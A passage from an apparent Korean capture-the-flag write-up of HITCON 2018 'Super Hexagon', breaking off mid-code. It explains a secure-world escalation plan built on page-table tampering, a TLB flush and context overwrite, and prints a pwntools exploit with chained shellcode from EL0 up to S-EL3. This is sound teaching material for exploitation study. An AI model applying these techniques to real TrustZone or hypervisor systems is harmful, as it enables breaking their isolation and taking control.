그런데 context switching 시에 보호해야 할 시스템 레지스터들이 RAM에 올라와있다.
이런 구조는 절대 격리가 유지될 수 있는 구조가 아니다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/7d9fcba3fcaf7667027c403d9b284076.png" alt=""  />

생각해낸 익스플로잇 시나리오는 다음과 같다.</p>
<ol>
<li>S-EL1 PTE 조작 → 쉘 코드 작성.</li>
<li>S-EL1 PTE 조작 → S-EL3 PTE 조작 → 쉘 코드 페이지 매핑.</li>
<li>S-EL1 PTE 조작 &amp; tlb flush → ctx.pc, ctx.cpsr 변조.</li>
<li>Secure monitor call → ACE.
여기서 세 번째 스텝이 tlb flush 인데 이건 같은 VA를 다른 PA에 매핑하기 위해 연속적으로 같은 VA에 접근해서 tlb가 캐싱되므로 이를 flush 하기 위해서 이용했다.
qemu는 mmu를 프로세서와 완전 동일하게는 아니여도 범용적인 mmu를 softmmu라는 feature로 mmu 에뮬레이션을 지원하기에 꼭 필요한 스텝이다.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">mmu_lookup1</span>(CPUState <span style="color:#f92672">*</span>cpu, MMULookupPageData <span style="color:#f92672">*</span>data,
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">int</span> mmu_idx, MMUAccessType access_type, <span style="color:#66d9ef">uintptr_t</span> ra)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    vaddr addr <span style="color:#f92672">=</span> data<span style="color:#f92672">-&gt;</span>addr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uintptr_t</span> index <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_index</span>(cpu, mmu_idx, addr);
</span></span><span style="display:flex;"><span>    CPUTLBEntry <span style="color:#f92672">*</span>entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_entry</span>(cpu, mmu_idx, addr);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> tlb_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_read_idx</span>(entry, access_type);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> maybe_resized <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    CPUTLBEntryFull <span style="color:#f92672">*</span>full;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> flags;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* If the TLB entry is for a different page, reload and try again.  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">tlb_hit</span>(tlb_addr, addr)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">victim_tlb_hit</span>(cpu, mmu_idx, index, access_type,
</span></span><span style="display:flex;"><span>                            addr <span style="color:#f92672">&amp;</span> TARGET_PAGE_MASK)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tlb_fill</span>(cpu, addr, data<span style="color:#f92672">-&gt;</span>size, access_type, mmu_idx, ra);
</span></span><span style="display:flex;"><span>            maybe_resized <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>            index <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_index</span>(cpu, mmu_idx, addr);
</span></span><span style="display:flex;"><span>            entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_entry</span>(cpu, mmu_idx, addr);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        tlb_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">tlb_read_idx</span>(entry, access_type) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>TLB_INVALID_MASK;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    full <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>cpu<span style="color:#f92672">-&gt;</span>neg.tlb.d[mmu_idx].fulltlb[index];
</span></span><span style="display:flex;"><span>    flags <span style="color:#f92672">=</span> tlb_addr <span style="color:#f92672">&amp;</span> (TLB_FLAGS_MASK <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>TLB_FORCE_SLOW);
</span></span><span style="display:flex;"><span>    flags <span style="color:#f92672">|=</span> full<span style="color:#f92672">-&gt;</span>slow_flags[access_type];
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">-&gt;</span>full <span style="color:#f92672">=</span> full;
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">-&gt;</span>flags <span style="color:#f92672">=</span> flags;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Compute haddr speculatively; depending on flags it might be invalid. */</span>
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">-&gt;</span>haddr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">uintptr_t</span>)addr <span style="color:#f92672">+</span> entry<span style="color:#f92672">-&gt;</span>addend);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> maybe_resized;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>다음과 같이 hit이면 그냥 저장된 인덱스에 맞춰서 바로 리턴하는 것을 확인할 수 있다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/1fd5a4f6f21cfa381a0f09b64430680b.png" alt=""  />

<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/43fadf48c377fbf274c369c10f9eb105.png" alt=""  />

쉘 코드 길이를 늘리기 위해선 그냥 여기서 fault 내고 더 낮은 exception vector offset으로 뛰면 0xd00 주변으로 뛸 수 있다.
그걸 이용해서 0xd00 주변에 쉘 코드를 배치한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/fd750aecd7c7b5e5a761b7f005a4e6fe.png" alt=""  />
</p>
<h2 id="exploit-code-code-execution--flag-2">Exploit code (code execution &amp; flag)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-code-execution--flag-2">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
</span></span><span style="display:flex;"><span>sc_st <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffd006</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> bytes(ks<span style="color:#f92672">.</span>asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w9, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    blr x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> shellcode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = remote(&#39;localhost&#39;,6666)</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./local_debug.sh&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./local_debug_secure.sh&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>gets) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shellcode
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0x1000</span>))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(sc_st)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">185</span>]
</span></span><span style="display:flex;"><span>SEL3_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x0, sp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>SEL3_shellcode <span style="color:#f92672">+=</span> bytes(read_flag)
</span></span><span style="display:flex;"><span>SEL3_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">ldr x11, =0x09000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov x8, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">loop_print_flag_sel3:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x1, sp, x8 // dst
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cmp x8, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    bne loop_print_flag_sel3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x000000000e002210 00000fb0</span>
</span></span><span style="display:flex;"><span>WORLD_SHARED_MEM_VA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x023fe000</span>
</span></span><span style="display:flex;"><span>WORLD_SHARED_MEM_PA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40033000</span> 
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    ldr r0, =</span><span style="color:#e6db74">{</span>WORLD_SHARED_MEM_VA<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r10, r0, #0x20c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r2, =0x100de8 // 0xe499000 + 0xde8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r0, r10, r9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r1, r2, r9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb r0, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb r0, [r1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add r9, r9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp r9, #</span><span style="color:#e6db74">{</span>len(SEL3_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // mapping
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, =0x8005008
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, =0xe00364f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, =0xe499783
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // ctx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, =0x8005008
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, =0xe00264f  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0] // tlb is already cached by the softmmu
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mcr p15, 0, r0, c8, c7, 0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    dsb sy
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    isb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0x1328
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, =0x800002cc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0x1330
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>) <span style="color:#75715e"># dummy code is added. </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># SEL1_shellcode += b&#39;\xfe\xff\xff\xea&#39; # loop for debugging</span>
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov r0, 0x8300
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    lsl r0, r0, #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    orr r0, r0, #0x7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>) <span style="color:#75715e"># separation needed.</span>
</span></span><span style="display:flex;"><span>SEL1_shellcode <span style="color:#f92672">+=</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;70 00 60 e1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TCI_Data_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010225c</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xf0\x08\xe8</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># thumb switch</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov r10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    lsl r10, r10, #16 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    orr r10, r10, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r10, r10, #0x10c 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #0xb
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, r10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0x0 // return to normal world
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;arm&#39;</span>)
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(SEL0_shellcode))
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> SEL1_shellcode
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(SEL0_shellcode) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x200</span> <span style="color:#f92672">-</span> len(SEL0_shellcode))
</span></span><span style="display:flex;"><span>SEL0_shellcode <span style="color:#f92672">+=</span> SEL3_shellcode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SEL0_shellcode_src <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40035500</span>
</span></span><span style="display:flex;"><span>UART<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000009000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> 
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x00000000e4990b0</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span><span style="color:#75715e"># chunk 1</span>
</span></span><span style="display:flex;"><span>TCI_Data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x1670</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0100060</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x14</span> <span style="color:#75715e"># chunk 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
